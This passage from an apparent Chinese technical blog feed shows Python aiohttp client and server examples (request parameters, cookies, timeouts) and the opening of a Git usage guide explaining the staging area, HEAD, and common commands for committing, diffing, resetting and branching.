asyncio<br><br><span class="hljs-keyword">import</span> aiohttp<br><br><br><span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span><br>    <span class="hljs-keyword">async</span> <span class="hljs-keyword">with</span> aiohttp.ClientSession() <span class="hljs-keyword">as</span> session:<br>        <span class="hljs-keyword">async</span> <span class="hljs-keyword">with</span> session.get(<span class="hljs-string">&#x27;http://httpbin.org/get&#x27;</span>) <span class="hljs-keyword">as</span> response:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;Status: <span class="hljs-subst">&#123;response.status&#125;</span>&#x27;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Content-type: <span class="hljs-subst">&#123;response.headers[<span class="hljs-string">&#x27;content-type&#x27;</span>]&#125;</span>&quot;</span>)<br>            html = <span class="hljs-keyword">await</span> response.text()<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;Body: <span class="hljs-subst">&#123;html&#125;</span>&#x27;</span>)<br><br><br>asyncio.run(main())<br><br>---------<br><span class="hljs-comment"># server</span><br><span class="hljs-keyword">from</span> aiohttp <span class="hljs-keyword">import</span> web<br><br><br><span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">handle</span>(<span class="hljs-params">request</span>):</span><br>    name = request.match_info.get(<span class="hljs-string">&#x27;name&#x27;</span>, <span class="hljs-string">&quot;Anonymous&quot;</span>)<br>    text = <span class="hljs-string">&quot;Hello, &quot;</span> + name<br>    <span class="hljs-keyword">return</span> web.Response(text=text)<br><br><br>app = web.Application()<br>app.add_routes([web.get(<span class="hljs-string">&#x27;/&#x27;</span>, handle), web.get(<span class="hljs-string">&#x27;/&#123;name&#125;&#x27;</span>, handle)])<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    web.run_app(app, host=<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, port=<span class="hljs-number">9643</span>)<br></code></pre></td></tr></table></figure><p><strong>示例二：ClientSession 常用方法</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> asyncio<br><br><span class="hljs-keyword">from</span> aiohttp <span class="hljs-keyword">import</span> ClientSession<br><br><br><span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get</span>(<span class="hljs-params">url, session: ClientSession</span>):</span><br>    <span class="hljs-comment"># 传递参数</span><br>    params_list = [<br>        &#123;<span class="hljs-string">&#x27;key1&#x27;</span>: <span class="hljs-string">&#x27;value1&#x27;</span>, <span class="hljs-string">&#x27;key2&#x27;</span>: <span class="hljs-string">&#x27;value2&#x27;</span>&#125;,  <span class="hljs-comment"># 字典形式（标准格式，由程序编码）</span><br>        [(<span class="hljs-string">&#x27;key&#x27;</span>, <span class="hljs-string">&#x27;value1&#x27;</span>), (<span class="hljs-string">&#x27;key&#x27;</span>, <span class="hljs-string">&#x27;value2&#x27;</span>)],  <span class="hljs-comment"># 元组列表形式（为一个键指定多个值）</span><br>        <span class="hljs-string">&#x27;key1=value1&amp;key2=value2&#x27;</span>  <span class="hljs-comment"># 字符串形式（不会自动编码）</span><br>    ]<br>    <span class="hljs-comment"># 自定义headers</span><br>    headers = &#123;<br>        <span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) &quot;</span><br>                      <span class="hljs-string">&quot;AppleWebKit/537.36 (KHTML, like Gecko) &quot;</span><br>                      <span class="hljs-string">&quot;Chrome/78.0.3904.108 Safari/537.36&quot;</span><br>    &#125;<br>    <span class="hljs-keyword">for</span> params <span class="hljs-keyword">in</span> params_list:<br>        <span class="hljs-comment"># ClientSession.get() 有一个必选的url参数，它必须是一个str或yarl.URL对象</span><br>        <span class="hljs-keyword">async</span> <span class="hljs-keyword">with</span> session.get(url, params=params, headers=headers) <span class="hljs-keyword">as</span> r:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;url: <span class="hljs-subst">&#123;r.url&#125;</span>&#x27;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;status: <span class="hljs-subst">&#123;r.status&#125;</span>&#x27;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;headers: <span class="hljs-subst">&#123;r.headers&#125;</span>&#x27;</span>)  <span class="hljs-comment"># 返回详细的响应头信息</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;requestInfo: <span class="hljs-subst">&#123;r.request_info&#125;</span>&#x27;</span>)  <span class="hljs-comment"># 返回详细的请求信息，包括url、method、headers</span><br><br>            res = <span class="hljs-keyword">await</span> r.text(encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>)  <span class="hljs-comment"># 使用response.read()读取二进制内容</span><br>            <span class="hljs-built_in">print</span>(res)<br><br><br><span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">post</span>(<span class="hljs-params">url, session: ClientSession</span>):</span><br>    <span class="hljs-comment"># 提交数据</span><br>    data_list = [<br>        <span class="hljs-string">&#x27;test&#x27;</span>,  <span class="hljs-comment"># 纯文本格式，text/plain</span><br>        <span class="hljs-string">b&#x27;test&#x27;</span>,  <span class="hljs-comment"># 二进制流格式，application/octet-stream</span><br>        &#123;<span class="hljs-string">&#x27;test&#x27;</span>: <span class="hljs-string">&#x27;object&#x27;</span>&#125;,  <span class="hljs-comment"># 表单格式，application/x-www-form-urlencoded</span><br>    ]<br>    <span class="hljs-keyword">for</span> data <span class="hljs-keyword">in</span> data_list:<br>        <span class="hljs-keyword">async</span> <span class="hljs-keyword">with</span> session.post(url, data=data) <span class="hljs-keyword">as</span> r:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;url: <span class="hljs-subst">&#123;r.url&#125;</span>&#x27;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-keyword">await</span> r.text())<br>    <span class="hljs-comment"># json格式，application/json</span><br>    <span class="hljs-keyword">async</span> <span class="hljs-keyword">with</span> session.post(url, json=&#123;<span class="hljs-string">&#x27;test&#x27;</span>: <span class="hljs-string">&#x27;object&#x27;</span>&#125;) <span class="hljs-keyword">as</span> r:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;url: <span class="hljs-subst">&#123;r.url&#125;</span>&#x27;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-keyword">await</span> r.text())<br><br><br><span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">cookie</span>(<span class="hljs-params">url, session: ClientSession</span>):</span><br>    <span class="hljs-keyword">async</span> <span class="hljs-keyword">with</span> session.get(url) <span class="hljs-keyword">as</span> r:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;url: <span class="hljs-subst">&#123;r.url&#125;</span>&#x27;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-keyword">await</span> r.json())  <span class="hljs-comment"># 返回json解码后的内容</span><br><br><br><span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span><br>    <span class="hljs-comment"># 自定义cookies</span><br>    cookies = &#123;<span class="hljs-string">&#x27;cookies_are&#x27;</span>: <span class="hljs-string">&#x27;working&#x27;</span>&#125;<br>    <span class="hljs-comment"># 在网络请求中，会话（session）是指同一用户与服务器进行交互的过程，aiohttp使用ClientSession来管理会话。</span><br>    <span class="hljs-comment"># 注意：不要为每个请求创建一个会话，最好是为每个应用程序创建一个会话，以执行所有请求。更复杂的情况可能需要对每个站点都有一个会话，例如一个用于Github，另一个用于Facebook。</span><br>    <span class="hljs-keyword">async</span> <span class="hljs-keyword">with</span> ClientSession(cookies=cookies) <span class="hljs-keyword">as</span> session:<br>        <span class="hljs-keyword">await</span> get(<span class="hljs-string">&#x27;http://httpbin.org/get&#x27;</span>, session)<br>        <span class="hljs-keyword">await</span> post(<span class="hljs-string">&#x27;http://httpbin.org/post&#x27;</span>, session)<br>        <span class="hljs-keyword">await</span> cookie(<span class="hljs-string">&#x27;http://httpbin.org/cookies&#x27;</span>, session)<br><br><br>asyncio.run(main())<br></code></pre></td></tr></table></figure><p><strong>示例三：aiohttp 限制并发连接数和超时时间</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> asyncio<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-keyword">from</span> aiohttp <span class="hljs-keyword">import</span> ClientSession, ClientTimeout, TCPConnector, client_exceptions<br><br><br><span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get</span>():</span><br>    conn = TCPConnector(limit=<span class="hljs-number">0</span>)  <span class="hljs-comment"># 限制同时连接数，默认为100，limit=0时无限制</span><br>    timeout = ClientTimeout(total=<span class="hljs-number">10</span>, connect=<span class="hljs-number">2</span>, sock_connect=<span class="hljs-number">2</span>, sock_read=<span class="hljs-number">10</span>)<br>    <span class="hljs-comment"># 默认total=5*60, connect=None, sock_connect=None, sock_read=None，为None或0时表示禁用特定的超时检查</span><br>    <span class="hljs-comment"># total：单次请求的最长时间（包括建立连接、发送请求和读取响应）</span><br>    <span class="hljs-comment"># connect：建立新连接或等待连接池中的空闲连接的最长时间</span><br>    <span class="hljs-comment"># sock_connect：建立新连接的最长时间（不是从池中给出的）</span><br>    <span class="hljs-comment"># sock_read：从服务端获取消息的最长时间</span><br><br>    <span class="hljs-keyword">async</span> <span class="hljs-keyword">with</span> ClientSession(connector=conn, timeout=timeout) <span class="hljs-keyword">as</span> session:<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">async</span> <span class="hljs-keyword">with</span> session.get(<span class="hljs-string">&#x27;http://127.0.0.1:9643/test&#x27;</span>) <span class="hljs-keyword">as</span> response:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;Body: <span class="hljs-subst">&#123;<span class="hljs-keyword">await</span> response.text()&#125;</span>&#x27;</span>)<br>        <span class="hljs-keyword">except</span> client_exceptions.ServerTimeoutError <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;Request timeout: <span class="hljs-subst">&#123;e&#125;</span>&#x27;</span>)<br>        <span class="hljs-keyword">finally</span>:<br>            <span class="hljs-keyword">pass</span><br><br><br><span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span><br>    st = time.perf_counter()<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">await</span> asyncio.wait_for(get(), timeout=<span class="hljs-number">10</span>)  <span class="hljs-comment"># 协程超时</span><br>    <span class="hljs-keyword">except</span> asyncio.exceptions.TimeoutError:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Coroutines timeout&#x27;</span>)<br>    <span class="hljs-keyword">finally</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;time: <span class="hljs-subst">&#123;time.perf_counter() - st&#125;</span>s&#x27;</span>)<br><br><br>asyncio.run(main())<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>后端开发</category>
      
      <category>Python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Python3</tag>
      
      <tag>高并发</tag>
      
      <tag>协程</tag>
      
      <tag>yield</tag>
      
      <tag>asyncio</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Git 使用指南</title>
    <link href="/post/Git%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/"/>
    <url>/post/Git%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/</url>
    
    <content type="html"><![CDATA[<p>Git 是目前世界上最先进的 <strong>分布式</strong> 版本控制系统，本文详细介绍了 Git 在单人模式和多人协作下的基本概念、使用方式和常用指令，最后对比了几种最流行的 Git 协同模型，可以更高效地进行团队开发。</p><h2 id="版本控制系统"><a href="#版本控制系统" class="headerlink" title="版本控制系统"></a>版本控制系统</h2><h3 id="SVN-集中式版本控制系统"><a href="#SVN-集中式版本控制系统" class="headerlink" title="SVN 集中式版本控制系统"></a>SVN 集中式版本控制系统</h3><ul><li>版本库放在中央服务器</li><li>必须联网才能工作</li><li>服务器磁盘故障存在数据丢失风险</li></ul><h3 id="Git-分布式版本控制系统"><a href="#Git-分布式版本控制系统" class="headerlink" title="Git 分布式版本控制系统"></a>Git 分布式版本控制系统</h3><ul><li>没有中央服务器，每台个人PC都有一个完整的版本库</li><li>工作时无需联网</li><li>通过把各自的修改推给对方进行协作</li><li>服务器数据丢失可用任意一个代码仓库恢复，宕机期间也可以提交代码到本地仓库</li><li>安全性强，Git管理的每一个文件、目录、提交等都拥有一个SHA-1哈希值</li></ul><h2 id="Git-独奏"><a href="#Git-独奏" class="headerlink" title="Git 独奏"></a>Git 独奏</h2><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><h4 id="暂存区"><a href="#暂存区" class="headerlink" title="暂存区"></a><a href="http://www.worldhello.net/got/img/Git%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/02-git-solo/020-git-stage.html#git-stage">暂存区</a></h4><ol><li>暂存区一般称为stage或index，只有添加到暂存区的文件才可以被提交。</li><li>暂存区保存在<code>./img/Git使用指南/index</code>文件中，是一个包含文件索引的目录树，有类似工作区的目录结构，其中记录了文件名、文件的状态信息等。</li><li>具体的文件内容保存在git对象库<code>./img/Git使用指南/objects</code>目录中，文件索引建立了文件和对象库中对象实体之间的对应关系。</li></ol><p><img src="/img/Git%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/git-stage.png" alt="git-stage"></p><h4 id="HEAD"><a href="#HEAD" class="headerlink" title="HEAD"></a><a href="http://www.zsythink.net/archives/3412">HEAD</a></h4><ol><li><p>可以把<code>HEAD</code>理解成一个指针，<code>HEAD</code>指针通常指向当前所在分支的分支指针，分支指针总是指向当前分支的最新提交，即通常情况下<code>HEAD</code>指针总是指向了当前分支的最新提交（通过分支指针间接指向）。</p><p><img src="/img/Git%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/image-20210113170457853.png" alt="从master检出test分支"></p></li><li><p><code>HEAD</code>指针和分支指针的当前指向，分别保存在<code>./img/Git使用指南/HEAD</code>文件和<code>./img/Git使用指南/refs/heads/&lt;branch&gt;</code>文件中。在git中，可以在<code>./img/Git使用指南/refs</code>目录下找到一系列含有SHA-1值的文件，这类文件也被称为“引用” （refs或references）。</p><blockquote><p>$ cat ./img/Git使用指南/HEAD<br>ref: refs/heads/test</p><p>$ cat ./img/Git使用指南/refs/heads/test<br>6f396a68315694be320949fba3f6a57d5e1c318f</p></blockquote></li><li><p>分离头指针（detached HEAD），即<code>HEAD</code>指针没有指向分支指针，而是直接指向了某个具体的提交。一般用来快速地基于某个提交进行一些实验或者测试，如果对结果满意就保留，否则就丢弃。</p><p><img src="/img/Git%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/image-20210111110814187.png" alt="检出某个提交时HEAD指针的变化"></p></li><li><p>在写法上，通常用<code>HEAD</code>表示当前版本，<code>HEAD^</code>是上一个版本，<code>HEAD^^</code>是上上一个版本，上100个版本可以写作<code>HEAD~100</code>。</p></li></ol><h3 id="创建仓库"><a href="#创建仓库" class="headerlink" title="创建仓库"></a>创建仓库</h3><p><img src="/img/Git%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/image-20210104142317464.png"></p><ul><li>git init：初始化仓库</li><li>git clone：克隆远程仓库</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> &lt;repo&gt; [&lt;dir&gt;] --depth=1 -b &lt;branch&gt; --single-branch  <span class="hljs-comment"># 克隆指定分支最近的一次提交</span><br></code></pre></td></tr></table></figure><ul><li>git config：修改配置文件（优先级：local &gt; global &gt; system）</li></ul><blockquote><p>初始化结果：生成.git文件（本地版本库），用户名和邮件地址配置成功（不做校验）</p></blockquote><h3 id="文件变更"><a href="#文件变更" class="headerlink" title="文件变更"></a>文件变更</h3><ul><li>git add：添加文件到暂存区</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">git add [file1] [file2] ... / [dir]<br>git add ./-A  <span class="hljs-comment"># 添加所有已跟踪和未跟踪文件的变更</span><br>git add -u  <span class="hljs-comment"># 更新已跟踪的文件变更（修改、删除）</span><br></code></pre></td></tr></table></figure><ul><li>git commit：提交暂存区文件到本地仓库</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">git commit -m <span class="hljs-string">&quot;message&quot;</span><br>git commit -m <span class="hljs-string">&quot;message&quot;</span> --amend  <span class="hljs-comment"># 追加提交</span><br></code></pre></td></tr></table></figure><ul><li>git status：查看工作区和暂存区之间的文件变更状态</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">git status  <span class="hljs-comment"># 标准显示</span><br>git status -s  <span class="hljs-comment"># 简洁显示</span><br>git status -v  <span class="hljs-comment"># 详细显示（文件内容改动）</span><br>git status --ignored  <span class="hljs-comment"># 显示被忽略的文件</span><br></code></pre></td></tr></table></figure><ul><li>git diff：比较文件内容差异</li></ul><p><img src="/img/Git%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/git-diff.png" alt="git-diff"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">git diff  <span class="hljs-comment"># 比较工作区和暂存区</span><br>git diff HEAD/&lt;branch&gt;/&lt;commit&gt;  <span class="hljs-comment"># 比较工作区和HEAD/branch/commit</span><br>git diff --cached  <span class="hljs-comment"># 比较暂存区和HEAD</span><br>git diff -- &lt;file&gt;/&lt;path&gt; <span class="hljs-comment"># 比较文件/目录差异</span><br>git diff &lt;commit1&gt; &lt;commit2&gt; -- &lt;paths&gt; <span class="hljs-comment"># 比较两个commit之间的具体文件差异</span><br>git diff --<span class="hljs-built_in">stat</span>  <span class="hljs-comment"># 摘要显示</span><br></code></pre></td></tr></table></figure><blockquote><p>当执行<code>git status</code>或<code>git diff</code>命令扫描工作区改动的时候，git会先依据<code>./img/Git使用指南/index</code>文件中记录的（已跟踪文件的）时间戳、长度等信息判断工作区文件是否改变。如果文件时间戳发生改变，则文件内容<strong>可能</strong>被修改了，此时再打开文件，对比文件内容，判断文件是否真正被更改。这也是Git高效的因素之一。</p></blockquote><ul><li>git rm：删除文件，并自动变更暂存区</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">git rm [&lt;options&gt;] [--] &lt;file&gt;...<br>git rm --cached --force -r &lt;file&gt;  <span class="hljs-comment"># 移除不需要跟踪的文件（不删除工作区文件）</span><br></code></pre></td></tr></table></figure><ul><li>git ls-files：查看工作区和暂存区的文件信息</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">git ls-files -c  <span class="hljs-comment"># 显示已缓存到暂存区的文件（默认）</span><br>git ls-files -s  <span class="hljs-comment"># 显示暂存区的文件对象信息（模式位，文件哈希值，暂存区编号，文件名）</span><br></code></pre></td></tr></table></figure><h3 id="版本切换"><a href="#版本切换" class="headerlink" title="版本切换"></a>版本切换</h3><ul><li><a href="https://git-scm.com/book/zh/v2/Git-%E5%9F%BA%E7%A1%80-%E6%9F%A5%E7%9C%8B%E6%8F%90%E4%BA%A4%E5%8E%86%E5%8F%B2">git log</a>：查看提交历史（显示当前<code>HEAD</code>之前的提交历史）</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">log</span>  <span class="hljs-comment"># 从近到远列出所有提交记录</span><br><span class="hljs-comment"># 显示参数</span><br>--<span class="hljs-built_in">stat</span>  <span class="hljs-comment"># 显示文件差异（行数统计）</span><br>-p  <span class="hljs-comment"># 显示文件差异（详细的具体改动）</span><br>--oneline  <span class="hljs-comment"># 简洁显示</span><br>--graph  <span class="hljs-comment"># 以ASCII图形模式显示</span><br>–-pretty  <span class="hljs-comment"># 格式化输出 %h-简短哈希字符串 %s-提交说明</span><br><span class="hljs-comment"># 筛选参数</span><br>-n  <span class="hljs-comment"># 限定数量</span><br>--since, --after  <span class="hljs-comment"># 限定指定时间之后的提交</span><br>--until, --before  <span class="hljs-comment"># 限定指定时间之前的提交</span><br>--author  <span class="hljs-comment"># 限定作者</span><br>--grep  <span class="hljs-comment"># 搜索commit关键字</span><br>--no-merges  <span class="hljs-comment"># 过滤掉merge commit</span><br>git <span class="hljs-built_in">log</span> --/commit/branch/tag  <span class="hljs-comment"># 限定路径/提交/分支/标签</span><br><span class="hljs-comment"># 示例</span><br>git <span class="hljs-built_in">log</span> --pretty=<span class="hljs-string">&quot;%h - %s&quot;</span> --author=<span class="hljs-string">&#x27;Junio C Hamano&#x27;</span> --since=<span class="hljs-string">&quot;2008-10-01&quot;</span> --before=<span class="hljs-string">&quot;2008-11-01&quot;</span> --no-merges -- <span class="hljs-built_in">test</span>/<br></code></pre></td></tr></table></figure><ul><li>git reflog：查看命令历史</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">git reflog  <span class="hljs-comment"># 可以查看已被删除的commit记录和reset操作（用来恢复本地错误操作）</span><br></code></pre></td></tr></table></figure><ul><li>git reset：重置</li></ul><p><img src="/img/Git%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/image-20210111143233457.png"></p><p><img src="/img/Git%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/image-20210111143215762.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">git reset [&lt;commit&gt;] [--] &lt;paths&gt;...  <span class="hljs-comment"># 不改变引用（值），替换暂存区中的文件，默认值为HEAD</span><br>git reset [--mixed|--soft|--hard] [&lt;commit&gt;]  <span class="hljs-comment"># 改变引用，有不同的选项</span><br>git reset HEAD  <span class="hljs-comment"># 撤销对暂存区的修改（将暂存区恢复到最近提交的状态，默认使用--mixed选项）</span><br>git reset --hard HEAD  <span class="hljs-comment"># 将工作区、暂存区都恢复到最近提交的状态</span><br>git reset --soft HEAD^  <span class="hljs-comment"># 只修改引用，不修改工作区、暂存区文件</span><br></code></pre></td></tr></table></figure><blockquote><p>reset实质：重置引用（改变<code>HEAD</code>指针所指向的分支指针指向，<code>HEAD</code>指针始终指向当前分支指针）</p></blockquote><p><img src="/img/Git%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/4428238-6dbab74ae9ad2e1f.gif"></p><ul><li>git revert：版本回滚</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">git revert &lt;commit&gt;  <span class="hljs-comment"># 回滚到指定的版本，回滚也会作为一次提交进行保存（适用于多人协同）</span><br></code></pre></td></tr></table></figure><blockquote><p>reset和revert的区别：git reset是回到某次commit，在本次commit之后的修改都会被删除；git revert是在最近一次commit之后生成一个新的commit，之前的所有commit都会被保留。</p></blockquote><h2 id="Git-和声"><a href="#Git-和声" class="headerlink" title="Git 和声"></a>Git 和声</h2><h3 id="分支管理"><a href="#分支管理" class="headerlink" title="分支管理"></a>分支管理</h3><ul><li>git branch：分支管理</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">git branch  <span class="hljs-comment"># 查看本地分支</span><br>git branch &lt;branch&gt; <span class="hljs-comment"># 创建本地分支</span><br>git branch -r  <span class="hljs-comment"># 查看远程分支</span><br>git branch -a  <span class="hljs-comment"># 查看全部分支</span><br>git branch -d &lt;branch&gt;  <span class="hljs-comment"># 删除分支</span><br>git branch -vv <span class="hljs-comment"># 查看本地分支和远程分支的关联关系</span><br>git branch -u/--set-upstream-to origin/&lt;远程分支名&gt; [&lt;本地分支名&gt;]<br><span class="hljs-comment"># 建立本地分支（默认为当前分支）与远程分支的关联</span><br>git branch --unset-upstream  <span class="hljs-comment"># 取消当前本地分支与远程分支的映射关系</span><br></code></pre></td></tr></table></figure><ul><li>git checkout：检出</li></ul><p><img src="/img/Git%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/git-checkout.png" alt="git-checkout"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">git checkout [&lt;commit&gt;] [--] &lt;paths&gt;...  <span class="hljs-comment"># 不改变HEAD指针，替换工作区中的文件，默认值是暂存区</span><br><span class="hljs-comment"># 省略&lt;commit&gt;时用暂存区文件覆盖工作区，不省略&lt;commit&gt;时用指定提交中的文件覆盖暂存区和工作区中对应的文件</span><br><span class="hljs-comment"># 用法：git checkout -- filename  // 放弃单个文件修改</span><br><span class="hljs-comment">#      git checkout –- . 或 git checkout .  // 撤销一切本地修改</span><br>git checkout &lt;commit&gt;  <span class="hljs-comment"># 检出某个提交，改变HEAD指针并进入“分离头指针”状态</span><br>git checkout &lt;branch&gt;  <span class="hljs-comment"># 改变HEAD指针，检出branch分支（完成图中的三个步骤）</span><br>git checkout -b &lt;new_branch&gt; <span class="hljs-comment"># 改变HEAD指针，创建并检出到新分支</span><br>git checkout -b &lt;本地分支名&gt; origin/&lt;远程分支名&gt;  <span class="hljs-comment"># 在本地创建和远程feature分支的对应分支</span><br><span class="hljs-comment"># 例：git checkout -b dev origin/feature 在本地创建和远程feature分支的对应dev分支</span><br></code></pre></td></tr></table></figure><blockquote><p>checkout实质：重置<code>HEAD</code></p></blockquote><h3 id="远程同步"><a href="#远程同步" class="headerlink" title="远程同步"></a><a href="http://www.ruanyifeng.com/blog/2014/06/git_remote.html">远程同步</a></h3><p><img 